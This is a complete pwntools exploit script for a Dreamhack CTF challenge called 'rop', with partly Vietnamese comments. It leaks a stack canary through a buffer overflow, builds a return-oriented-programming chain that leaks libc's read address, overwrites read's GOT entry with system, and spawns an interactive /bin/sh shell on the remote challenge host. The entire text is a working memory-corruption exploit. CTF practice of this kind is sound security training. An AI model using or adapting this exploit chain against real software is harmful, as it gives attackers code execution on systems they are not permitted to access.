#!/usr/bin/env python3
from pwn import *
exe = ELF('rop', checksec = False)
libc = ELF('libc.so.6', checksec = False)

# p = process(exe.path)
p = remote('host8.dreamhack.games', 20244)

#stage 1 leak canary

p.sendafter(b'Buf: ', b'A'*0x39)
p.recvuntil(b'A'*0x39)
canary_leak = u64(b'\0' + p.recv(7))
log.info("canary leak: " + hex(canary_leak))

pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x00000000004007e2

#stage 2 leak libc read and turn back read func to put new payload

#leak libc
payload = b'A'*0x38 + p64(canary_leak) + p64(0)
payload += p64(pop_rdi) + p64(1) # tham số thứ 1
payload += p64(pop_rsi_r15) + p64(exe.got.read) # tham số thứ 2
payload += p64(0) #r15
payload += p64(exe.plt.write) #write(1, read_got, ...)

#turn readgot into system
payload += p64(pop_rdi) + p64(0) # tham số thứ 1
payload += p64(pop_rsi_r15) + p64(exe.got.read) # tham số thứ 2
payload += p64(0) #r15
payload += p64(exe.plt.read)

#place to put "/bin/sh" and call read plt (at this time readgot turn into system)
payload += p64(pop_rdi) + p64(exe.got.read + 0x8) # tham số thứ 1
payload += p64(ret) + p64(exe.plt.read)

# input()
p.sendafter(b'Buf: ', payload)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym.read
log.info("libc leak: " + hex(libc_leak))

#stage 3 get shell
payload = p64(libc.sym['system']) + b'/bin/sh'
p.send(payload)

p.interactive()
